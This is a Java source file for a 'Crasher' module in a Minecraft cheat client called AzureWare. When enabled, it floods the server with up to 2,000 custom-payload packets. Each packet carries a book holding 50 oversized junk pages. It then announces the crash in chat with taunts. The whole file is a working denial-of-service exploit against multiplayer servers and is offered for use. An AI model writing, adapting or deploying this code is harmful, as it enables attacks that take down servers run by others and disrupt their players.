package net.AzureWare.mod.mods.PLAYER;

import com.darkmagician6.eventapi.EventTarget;

import net.AzureWare.events.EventUpdate;
import net.AzureWare.mod.Mod;
import net.AzureWare.utils.TimeHelper;
import net.AzureWare.value.Value;
import io.netty.buffer.Unpooled;
import java.io.IOException;
import java.util.Random;

import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class Crasher extends Mod {
   private Value packets = new Value("Crasher_Packets", Double.valueOf(200.0D), Double.valueOf(50.0D), Double.valueOf(2000.0D), 10.0D);
   private Value message = new Value("Crasher_SendMessage", Boolean.valueOf(true));
   
   public Crasher() {
      super("Crasher", Category.PLAYER);
   }

   public void onEnable(){
	   if(((Boolean)message.getValueState()).booleanValue()) {
		   this.mc.thePlayer.sendChatMessage("![AzureWare]Crashed by AzureWare Client.");
		   this.mc.thePlayer.sendChatMessage("![AzureWare]L for LiquidBounce and Jigsaw Hackers.");
	   }
	   for (int i=0;i<=((Double)this.packets.getValueState()).intValue();i++) {
		   triggerLOL();
	   }
	   try {
		this.set(false);
	} catch (Exception e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
   }

   public static void triggerLOL() {
       final NetHandlerPlayClient sendQueue = Minecraft.getMinecraft().getNetHandler();
       try {
           final ItemStack bookObj = new ItemStack(Items.writable_book);
           final String author = "xDark" + Math.random() * 400.0;
           final String title = "LOL KEK " + Math.random() * 400.0;
           final String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
           final NBTTagCompound tag = new NBTTagCompound();
           final NBTTagList list = new NBTTagList();
           for (int i = 0; i < 50; ++i) {
               final String siteContent = mm255;
               final NBTTagString tString = new NBTTagString(siteContent);
               list.appendTag((NBTBase)tString);
           }
           tag.setString("author", author);
           tag.setString("title", title);
           tag.setTag("pages", (NBTBase)list);
           if (bookObj.hasTagCompound()) {
               final NBTTagCompound nbttagcompound = bookObj.getTagCompound();
               nbttagcompound.setTag("pages", (NBTBase)list);
           }
           else {
               bookObj.setTagInfo("pages", (NBTBase)list);
           }
           String s2 = "MC|BEdit";
           if (new Random().nextBoolean()) {
               s2 = "MC|BSign";
           }
           bookObj.setTagCompound(tag);
           final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
           packetbuffer.writeItemStackToBuffer(bookObj);
           Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload(s2, packetbuffer));
       }
       catch (Exception ex) {}
   }
}
